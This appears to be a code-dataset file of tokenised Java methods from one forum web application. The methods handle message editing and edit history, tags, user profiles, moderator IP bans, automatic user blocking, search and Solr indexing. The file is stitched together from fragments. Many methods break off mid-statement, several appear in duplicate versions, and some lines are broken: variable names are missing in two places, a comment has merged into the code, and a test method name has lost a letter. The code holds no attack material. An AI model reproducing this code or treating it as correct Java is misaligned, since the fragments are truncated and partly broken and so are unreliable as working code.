public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid , HttpSession session , HttpServletRequest request ) throws Exception { if ( ! Template . isSessionAuthorized ( session ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private static ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( defaultValue = " 0 " , value = " offset " ) int offset , @RequestParam ( defaultValue = " false " ) boolean lastmod , HttpServletRequest request , Integer year , Integer month ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Template tmpl = Template . getTemplate ( request ) ; boolean showDeleted = request . getParameter ( " deleted " ) ! = null ; params . put ( " showDeleted " , showDeleted ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private static int getArchiveCount ( Connection db , int groupid , int year , int month ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT c FROM monthly_stats WHERE groupid= " + groupid + " AND year= " + year + " AND month= " + month ) ; if ( ! rs . next ( ) ) { return 0 ; 
public ModelAndView reindexAll ( ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = LorDataSource . getConnection ( ) ; try { if ( ! tmpl . isSessionAuthorized ( ) ) { 
public ModelAndView reindexCurrentMonth ( ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = LorDataSource . getConnection ( ) ; try { if ( ! tmpl . isSessionAuthorized ( ) ) { 
public ModelAndView add ( HttpServletRequest request , @RequestParam ( " msg " ) String msg ) throws Exception { Connection db = null ; Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new UserErrorException ( " Not authorized " ) ; } try { db = LorDataSource . getConnection ( ) ; 
public boolean isCommentsAllowed ( User user ) { if ( user ! = null & & user . isBlocked ( ) ) { return false ; } if ( deleted | | expired ) { return false ; } int score = getPostScore ( ) ; if ( score = = POSTSCORE_UNRESTRICTED ) { return true ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . canModerate ( ) ) { return true ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return true ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = userid ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return true ; 
private void reindexMessage ( Connection db , int msgid , boolean withComments ) throws IOException , SolrServerException , SQLException , MessageNotFoundException { Message msg = new Message ( db , msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = CommentList.getCommentList(db, msg, true); 
public void updateMessageText ( Connection db , User editor ) throws SQLException { PreparedStatement pstGet = db . prepareStatement ( " SELECT message,title FROM msgbase JOIN topics ON msgbase.id=topics.id WHERE topics.id=? FOR UPDATE " ) ; PreparedStatement pst = db . prepareStatement ( " UPDATE msgbase SET message=? WHERE id=? " ) ; PreparedStatement pstInfo = db . prepareStatement ( " INSERT INTO edit_info (msgid, editor, oldmessage, oldtitle) VALUES(?,?,?,?) " ) ; pstGet . setInt ( 1 , msgid ) ; ResultSet rs = pstGet . executeQuery ( ) ; if ( ! rs . next ( ) ) { throw new RuntimeException ( " Can't fetch previous message text " ) ; } pst . setString ( 1 , message ) ; pst . setInt ( 2 , msgid ) ; pstInfo . setInt ( 1 , msgid ) ; pstInfo . setInt ( 2 , editor . getId ( ) ) ; String oldMessage = rs . getString ( " message " ) ; String oldTitle = rs . getString ( " title " ) ; boolean modified = false ; if ( ! oldMessage . equals ( message ) ) { pstInfo . setString ( 3 , oldMessage ) ; modified = true ; } else { pstInfo . setString ( 3 , null ) ; } if ( ! oldTitle . equals ( title ) ) { modified = true ; pstInfo . setString ( 4 , oldTitle ) ; } else { pstInfo . setString ( 4 , null ) ; } if ( modified ) { pstInfo . executeUpdate ( ) ; 
public boolean apply ( EditInfoDTO dto ) { return dto . getOldmessage ( ) ! = null ; } 
public String toString ( ) { if ( tags . isEmpty ( ) ) { return " " ; } StringBuilder str = new StringBuilder ( ) ; for ( String tag : tags ) { str . append ( str . length ( ) > 0 ? " , " : " " ) . append ( tag ) ; } return str . toString ( ) ; } 
public static void updateCounters ( Connection con , List < String > oldTags , List < String > newTags ) throws SQLException { PreparedStatement stInc = con . prepareStatement ( " UPDATE tags_values SET counter=counter+1 WHERE id=? " ) ; PreparedStatement stDec = con . prepareStatement ( " UPDATE tags_values SET counter=counter-1 WHERE id=? " ) ; for ( String tag : newTags ) { if ( ! oldTags . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; stInc . setInt ( 1 , id ) ; stInc . executeUpdate ( ) ; } } for ( String tag : oldTags ) { if ( ! newTags . contains ( tag ) ) { 
public static boolean updateTags ( Connection con , int msgid , List < String > tagList ) throws SQLException { List < String > oldTags = new Tags ( con , msgid ) . tags ; PreparedStatement insertStatement = con . prepareStatement ( " INSERT INTO tags VALUES(?,?) " ) ; PreparedStatement deleteStatement = con . prepareStatement ( " DELETE FROM tags WHERE msgid=? and tagid=? " ) ; insertStatement . setInt ( 1 , msgid ) ; deleteStatement . setInt ( 1 , msgid ) ; boolean modified = false ; for ( String tag : tagList ) { if ( ! oldTags . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; insertStatement . setInt ( 2 , id ) ; insertStatement . executeUpdate ( ) ; modified = true ; } } for ( String tag : oldTags ) { if ( ! tagList . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; deleteStatement . setInt ( 2 , id ) ; deleteStatement . executeUpdate ( ) ; modified = true ; } } insertStatement . close ( ) ; deleteStatement . close ( ) ; return modified ; } 
public static ImmutableList < String > getMessageTags ( Connection con , int msgid ) throws SQLException { ImmutableList . Builder < String > tags = ImmutableList . builder ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT tags_values.value FROM tags, tags_values WHERE tags.msgid=? AND tags_values.id=tags.tagid ORDER BY value " ) ; st . setInt ( 1 , msgid ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { tags . add ( rs . getString ( " value " ) ) ; } st . close ( ) ; return tags . build ( ) ; } 
public static String toString ( Collection < String > tags ) { if ( tags . isEmpty ( ) ) { return " " ; } StringBuilder str = new StringBuilder ( ) ; for ( String tag : tags ) { str . append ( str . length ( ) > 0 ? " , " : " " ) . append ( tag ) ; } return str . toString ( ) ; } 
public void updateMessageText ( Connection db , User editor ) throws SQLException { PreparedStatement pstGet = db . prepareStatement ( " SELECT message,title FROM msgbase JOIN topics ON msgbase.id=topics.id WHERE topics.id=? FOR UPDATE " ) ; PreparedStatement pst = db . prepareStatement ( " UPDATE msgbase SET message=? WHERE id=? " ) ; PreparedStatement pstInfo = db . prepareStatement ( " INSERT INTO edit_info (msgid, editor, oldmessage, oldtitle) VALUES(?,?,?,?) " ) ; pstGet . setInt ( 1 , msgid ) ; ResultSet rs = pstGet . executeQuery ( ) ; if ( ! rs . next ( ) ) { throw new RuntimeException ( " Can't fetch previous message text " ) ; } pst . setString ( 1 , message ) ; pst . setInt ( 2 , msgid ) ; pstInfo . setInt ( 1 , msgid ) ; pstInfo . setInt ( 2 , editor . getId ( ) ) ; String oldMessage = rs . getString ( " message " ) ; String oldTitle = rs . getString ( " title " ) ; rs . close ( ) ; pstGet . close ( ) ; boolean modified = false ; if ( ! oldMessage . equals ( message ) ) { pstInfo . setString ( 3 , oldMessage ) ; modified = true ; } else { pstInfo . setString ( 3 , null ) ; } if ( ! oldTitle . equals ( title ) ) { modified = true ; pstInfo . setString ( 4 , oldTitle ) ; PreparedStatement pstMeta = db . prepareStatement ( " UPDATE topics SET title=? WHERE id=? " ) ; pstMeta . setString ( 1 , title ) ; pstMeta . setInt ( 2 , msgid ) ; pstMeta . executeUpdate ( ) ; pstMeta . close ( ) ; } else { pstInfo . setString ( 4 , null ) ; } if ( modified ) { pstInfo . executeUpdate ( ) ; pst . executeUpdate ( ) ; } pst . close ( ) ; } 
public void updateMessageText ( Connection db , User editor ) throws SQLException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , true ) ; PreparedStatement pstGet = db . prepareStatement ( " SELECT message,title FROM msgbase JOIN topics ON msgbase.id=topics.id WHERE topics.id=? FOR UPDATE " ) ; pstGet . setInt ( 1 , msgid ) ; ResultSet rs = pstGet . executeQuery ( ) ; if ( ! rs . next ( ) ) { throw new RuntimeException ( " Can't fetch previous message text " ) ; } String oldMessage = rs . getString ( " message " ) ; String oldTitle = rs . getString ( " title " ) ; rs . close ( ) ; pstGet . close ( ) ; EditInfoDTO editInfo = new EditInfoDTO ( ) ; editInfo . setMsgid ( msgid ) ; editInfo . setEditor ( editor . getId ( ) ) ; boolean modified = false ; if ( ! oldMessage . equals ( message ) ) { editInfo . setOldmessage ( oldMessage ) ; modified = true ; } SimpleJdbcTemplate jdbcTemplate = new SimpleJdbcTemplate ( scds ) ; if ( ! oldTitle . equals ( title ) ) { modified = true ; editInfo . setOldtitle ( oldTitle ) ; jdbcTemplate . update ( " UPDATE topics SET title=:title WHERE id=:id " , ImmutableMap . of ( " title " , title , " id " , msgid ) ) ; } if ( modified ) { SimpleJdbcInsert insert = 
public List < EditInfoDTO > loadEditInfo ( Connection db ) throws SQLException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , true ) ; SimpleJdbcTemplate jdbcTemplate = new SimpleJdbcTemplate ( scds ) ; List < EditInfoDTO > list = jdbcTemplate . query ( " SELECT * FROM edit_info WHERE msgid=? ORDER BY id DESC " , BeanPropertyRowMapper . newInstance ( EditInfoDTO . class ) , msgid ) ; return ImmutableList . copyOf ( list ) ; } 
public List < EditInfoDTO > loadEditInfo ( Connection db ) { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , true ) ; SimpleJdbcTemplate jdbcTemplate = new SimpleJdbcTemplate ( scds ) ; List < EditInfoDTO > list = jdbcTemplate . query ( " SELECT * FROM edit_info WHERE msgid=? ORDER BY id DESC " , BeanPropertyRowMapper . newInstance ( EditInfoDTO . class ) , msgid ) ; return ImmutableList . copyOf ( list ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = properties . getProperty ( " HTMLPathPrefix " ) ; item . setHtmlPath ( htmlPath ) ; try { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
private void addComment ( String s ) { if ( comments = = null ) { tcomments = new ArrayList < String > ( ) ; } tcomments . add ( s ) ; } 
public ModelAndView delIp ( HttpServletRequest request , @RequestParam ( " reason " ) String reason , @RequestParam ( " ip " ) String ip , @RequestParam ( " time " ) String time ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Map < Integer , String > deleted = new HashMap < Integer , String > ( ) ; Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView listAdd ( HttpServletRequest request , @RequestParam String nick ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView removeUserpic ( ServletRequest request , @RequestParam ( " id " ) int id ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not autorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public static EditInfoDTO createFromMessage ( Connection db , Message message ) throws SQLException { EditInfoDTO current = new EditInfoDTO ( ) ; current . setOldmessage ( message . getMessage ( ) ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( Tags . toString ( Tags . getMessageTags ( db , message . getMessageId ( ) ) ) ) ; return current ; } 
public boolean updateMessageText ( Connection db , User editor , List < String > newTags ) throws SQLException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , true ) ; PreparedStatement pstGet = db . prepareStatement ( " SELECT message,title FROM msgbase JOIN topics ON msgbase.id=topics.id WHERE topics.id=? FOR UPDATE " ) ; pstGet . setInt ( 1 , msgid ) ; ResultSet rs = pstGet . executeQuery ( ) ; if ( ! rs . next ( ) ) { throw new RuntimeException ( " Can't fetch previous message text " ) ; } String oldMessage = rs . getString ( " message " ) ; String oldTitle = rs . getString ( " title " ) ; rs . close ( ) ; pstGet . close ( ) ; List < String > oldTags = Tags . getMessageTags ( db , msgid ) ; EditInfoDTO editInfo = new EditInfoDTO ( ) ; editInfo . setMsgid ( msgid ) ; editInfo . setEditor ( editor . getId ( ) ) ; boolean modified = false ; SimpleJdbcTemplate jdbcTemplate = new SimpleJdbcTemplate ( scds ) ; if ( ! oldMessage . equals ( message ) ) { editInfo . setOldmessage ( oldMessage ) ; modified = true ; jdbcTemplate . update ( " UPDATE msgbase SET message=:message WHERE id=:msgid " , ImmutableMap . of ( " message " , message , " msgid " , msgid ) ) ; } if ( ! oldTitle . equals ( title ) ) { modified = true ; editInfo . setOldtitle ( oldTitle ) ; jdbcTemplate . update ( " UPDATE topics SET title=:title WHERE id=:id " , ImmutableMap . of ( " title " , title , " id " , msgid ) ) ; } if ( newTags ! = null ) { boolean modifiedTags = Tags . updateTags ( db , msgid , newTags ) ; if ( modifiedTags ) { editInfo . setOldtags ( Tags . toString ( oldTags ) ) ; Tags . updateCounters ( db , oldTags , newTags ) ; modified = true ; } } if ( modified ) { SimpleJdbcInsert insert = new SimpleJdbcInsert ( scds ) . withTableName ( " edit_info " ) . usingColumns ( " msgid " , " editor " , " oldmessage " , " oldtitle " , " oldtags " ) ; insert . execute ( new BeanPropertySqlParameterSource ( editInfo ) ) ; } return modified ; } 
public ModelAndView showForm ( ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } return new ModelAndView ( " edit-profile " ) ; } 
public int getCommentPage ( Comment comment , Template tmpl ) throws UtilException { int messages = tmpl . getProf ( ) . getMessages ( ) ; boolean reverse = tmpl . getProf ( ) . isShowNewFirst ( ) ; return getCommentPage ( comment , messages , reverse ) ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < String , Object > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " tango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( TAGS_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; defaults . put ( SHOWINFO_PROPERTY , Boolean . TRUE ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( " showsticky " , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , true ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings defaults.put(MAIN_3COLUMNS_PROPERTY, Boolean.FALSE); ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); ImmutableList<String> boxes31 = ImmutableList.of( "ibm", "poll", "archive", "tagcloud" ); defaults.put(BOXES_MAIN31_PROPERTY, boxes31); ImmutableList<String> boxes32 = ImmutableList.of( "top10", "gallery", "tshirt" ); defaults.put(BOXES_MAIN32_PROPERTY, boxes32); return defaults; } 
public void write ( OutputStream df ) throws IOException { ProfileHashtable profileHashtable = properties . getHashtable ( ) ; profileHashtable . setObject ( ProfileProperties . TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; ObjectOutputStream dof = null ; try { dof = new ObjectOutputStream ( df ) ; 
public boolean isShowNewFirst ( ) { return showNewFirst ; } 
public boolean isShowPhotos ( ) { return showPhotos ; } 
public boolean isHideAdsense ( ) { return hideAdsense ; } 
public boolean isShowGalleryOnMain ( ) { return showGalleryOnMain ; } 
public boolean isThreeColumnsOnMain ( ) { return threeColumnsOnMain ; } 
public boolean isShowAnonymous ( ) { return showAnonymous ; } 
private static String fixFormat ( String mode ) { if ( ! " ntobrq " . equals ( mode ) & & ! " quot " . equals ( mode ) & & ! " tex " . equals ( mode ) & & ! " ntobr " . equals ( mode ) & & ! " lorcode " . equals ( mode ) ) { return ( String ) Profile . getDefaults ( ) . get ( " format.mode " ) ; } return mode ; } 
private static String fixStyle ( String style ) { if ( ! DefaultProfile . isStyle ( style ) ) { return ( String ) Profile . getDefaults ( ) . get ( STYLE_PROPERTY ) ; } return style ; } 
public void estModification ( ) throws Exception { Profile profile = new Profile ( ) ; assertNotSame ( 125 , profile . getProperties ( ) . getMessages ( ) ) ; profile . getProperties ( ) . setMessages ( 125 ) ; ByteArrayOutputStream os = new ByteArrayOutputStream ( ) ; profile . write ( os ) ; Profile profile1 = new Profile ( new ByteArrayInputStream ( os . toByteArray ( ) ) ) ; assertEquals ( 125 , profile1 . getProperties ( ) . getMessages ( ) ) ; } 
public int doStartTag ( ) throws JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = object ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } @SuppressWarnings ( " unchecked " ) List < String > boxnames = . getProf ( ) . getList ( s ) ; CollectionUtils . filter ( boxnames , new Predicate ( ) { @Override public boolean evaluate ( Object o ) { String s = ( String ) o ; return DefaultProfile . isBox ( s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < String , Object > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " tango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( TAGS_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , true ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings defaults.put(MAIN_3COLUMNS_PROPERTY, Boolean.FALSE); ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); ImmutableList<String> boxes31 = ImmutableList.of( "ibm", "poll", "archive", "tagcloud" ); defaults.put(BOXES_MAIN31_PROPERTY, boxes31); ImmutableList<String> boxes32 = ImmutableList.of( "top10", "gallery", "tshirt" ); defaults.put(BOXES_MAIN32_PROPERTY, boxes32); return defaults; } 
private void updateMessage ( Message topic ) throws IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , topic . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , topic . getMessageId ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; doc . addField ( " title " , topic . getTitle ( ) ) ; doc . addField ( " message " , topic . getMessage ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Message topic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , comment . getTopic ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle = = null | | commentTitle . isEmpty ( ) ) { doc . addField ( " title " , topic . getTitle ( ) ) ; } else { doc . addField ( " title " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , true ) ; return doc ; } 
public void updateStats ( ) { logger . debug ( " Updating statistics " ) ; statUpdate . execute ( ) ; statUpdate2 . execute ( ) ; statMonthly . execute ( ) ; } 
public void updateScore ( ) throws Exception { logger . info ( " Updating score " ) ; jdbcTemplate . update ( " update users set score=score+1 " + " where id in " + " (select distinct comments.userid from comments, topics " + " where comments.postdate>CURRENT_TIMESTAMP-'2 days'::interval " + " and topics.id=comments.topic and " + " groupid!=8404 and groupid!=4068 and groupid!=19390 and " + " not comments.deleted and not topics.deleted) " ) ; jdbcTemplate . update ( " update users set max_score=score where score>max_score " ) ; } 
public void block ( ) throws Exception { jdbcTemplate . update ( " update users set blocked='t' where id in (select id from users where score<-50 and nick!='anonymous' and max_score<150 and not blocked) " ) ; jdbcTemplate . update ( " update users set blocked='t' where id in (select id from users where score<-50 and nick!='anonymous' and max_score<150 and blocked is null) " ) ; } 
public void deleteInactivated ( ) throws Exception { jdbcTemplate . update ( " delete from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'1 week'::interval " ) ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " time " ) String time ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( time ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( time ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( time ) ) { } else if ( " custom " . equals ( time ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { throw new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp ts ; if ( " unlim " . equals ( time ) ) { ts = null ; } else { ts = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView sameIP ( HttpServletRequest request , @RequestParam ( required = false ) Integer msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public static boolean getBoolean ( ServletRequest rq , String name ) throws ServletParameterException , ServletRequestBindingException { int value = ServletRequestUtils . getRequiredIntParameter ( rq , name ) ; switch ( value ) { case 0 : 
public static String getIP ( ServletRequest rq , String name ) throws ServletParameterException , ServletRequestBindingException { String ip = ServletRequestUtils . getRequiredStringParameter ( rq , name ) ; if ( ! ipRE . matcher ( ip ) . matches ( ) ) { throw new ServletParameterBadValueException ( name , " not ip " ) ; } return ip ; } 
public String search ( Model model , @ModelAttribute ( " query " ) SearchRequest query , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort ) throws Exception { Map < String , Object > params = model . asMap ( ) ; boolean initial = query . isInitial ( ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; SearchViewer . SearchInterval date = parseInterval ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( query ) ; sv . setInterval ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; Connection db = null ; try { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; QueryResponse response = sv . performSearch ( solrServer , db ) ; SolrDocumentList list = response . getResults ( ) ; List < SearchItem > res = new ArrayList < SearchItem > ( list . size ( ) ) ; for ( SolrDocument doc : list ) { res . add ( new SearchItem ( db , doc ) ) ; } long time = System . currentTimeMillis ( ) - current ; params . put ( " result " , res ) ; params . put ( " searchTime " , response . getElapsedTime ( ) ) ; params . put ( " numFound " , list . getNumFound ( ) ) ; params . put ( " time " , time ) ; } finally { JdbcUtils . closeConnection ( db ) ; } } return " search " ; } 
public boolean isInitial ( ) { return q . isEmpty ( ) ; } 
public boolean isUsertopic ( ) { return usertopic ; } 
public boolean isIgnoreTitle ( ) { return ignoreTitle ; } 
public String search ( Model model , @ModelAttribute ( " query " ) SearchRequest query , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " sort " , required = false ) Integer sort ) throws Exception { Map < String , Object > params = model . asMap ( ) ; boolean initial = query . isInitial ( ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; SearchViewer . SearchInterval date = parseInterval ( dateString ) ; params . put ( " date " , date ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( query ) ; sv . setInterval ( date ) ; sv . setInclude ( include ) ; sv . setSort ( sort ) ; Connection db = null ; try { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; QueryResponse response = sv . performSearch ( solrServer , db ) ; SolrDocumentList list = response . getResults ( ) ; List < SearchItem > res = new ArrayList < SearchItem > ( list . size ( ) ) ; for ( SolrDocument doc : list ) { res . add ( new SearchItem ( db , doc ) ) ; } long time = System . currentTimeMillis ( ) - current ; params . put ( " result " , res ) ; params . put ( " searchTime " , response . getElapsedTime ( ) ) ; params . put ( " numFound " , list . getNumFound ( ) ) ; params . put ( " time " , time ) ; } finally { JdbcUtils . closeConnection ( db ) ; } } return " search " ; } 
public String search ( Model model , @ModelAttribute ( " query " ) SearchRequest query , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString ) throws Exception { Map < String , Object > params = model . asMap ( ) ; boolean initial = query . isInitial ( ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; SearchViewer . SearchInterval date = parseInterval ( dateString ) ; params . put ( " date " , date ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( query ) ; sv . setInterval ( date ) ; sv . setInclude ( include ) ; Connection db = null ; try { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; QueryResponse response = sv . performSearch ( solrServer , db ) ; SolrDocumentList list = response . getResults ( ) ; List < SearchItem > res = new ArrayList < SearchItem > ( list . size ( ) ) ; for ( SolrDocument doc : list ) { res . add ( new SearchItem ( db , doc ) ) ; } long time = System . currentTimeMillis ( ) - current ; params . put ( " result " , res ) ; params . put ( " searchTime " , response . getElapsedTime ( ) ) ; params . put ( " numFound " , list . getNumFound ( ) ) ; params . put ( " time " , time ) ; } finally { JdbcUtils . closeConnection ( db ) ; } } return " search " ; } 
private static int parseInclude ( String include ) { if ( include = = null ) { return SearchViewer . SEARCH_ALL ; } if ( " topics " . equals ( include ) ) { return SearchViewer . SEARCH_TOPICS ; } return SearchViewer . SEARCH_ALL ; } 
